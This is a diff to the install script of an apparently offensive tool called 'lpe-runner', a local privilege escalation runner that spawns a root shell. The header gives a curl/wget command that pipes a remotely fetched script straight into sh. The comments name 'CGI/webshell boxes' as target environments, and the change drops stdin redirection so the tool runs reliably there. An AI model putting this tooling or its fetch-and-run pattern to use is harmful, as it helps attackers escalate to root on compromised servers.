@@ -10,11 +10,14 @@
 # Or if curl is missing:
 #   wget -qO- https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main/lpe-runner/install.sh | sh
 #
-# Detach stdin ONLY for the final lpe-runner exec, not for the whole script.
-# Doing `exec 0</dev/null` globally breaks `curl ... | sh` because sh reads
-# the script from stdin — redirecting it mid-script makes sh hit EOF and
-# silently stop running. We instead hand the runner a real TTY (so the root
-# shell it spawns is interactive) and fall back to /dev/null otherwise.
+# NOTE: We deliberately do NOT touch stdin here. Previous versions tried
+# `exec 0</dev/null` or redirecting to /dev/tty, both of which break on
+# different server types:
+#   - `exec 0</dev/null` kills `curl|sh` because sh reads the script from stdin
+#   - `/dev/tty` redirect fails with ENXIO on hosts with no controlling terminal
+#     (CGI/webshell boxes, nohup, cron, etc.)
+# lpe-runner's spawnPTY() handles /dev/tty internally — it opens /dev/tty if
+# available, falls back to os.Stdin otherwise. So we just download and exec.
 
 set -e
 
@@ -47,17 +50,4 @@ echo "[*] Starting lpe-runner (auto-fetch enabled) ..."
 echo "    All files fetched into: $DIR"
 echo
 
-# Detach stdin from the pipe for the runner so that:
-#  - it does not consume bytes meant for the root shell it spawns
-#  - the interactive root shell reads from a real TTY when one exists
-#  - in non-interactive contexts (CGI/webshell/nohup), falls back to /dev/null
-#
-# Note: `test -r /dev/tty` is NOT enough — on hosts with no controlling
-# terminal (common CGI/webshell boxes), /dev/tty exists and appears
-# readable but OPENING it fails with ENXIO ("No such device or address").
-# We probe by actually opening it in a subshell; only then do we use it.
-if (exec </dev/tty) 2>/dev/null; then
-    exec ./"$BIN" "$@" </dev/tty
-else
-    exec ./"$BIN" "$@" </dev/null
-fi
+exec ./"$BIN" "$@"
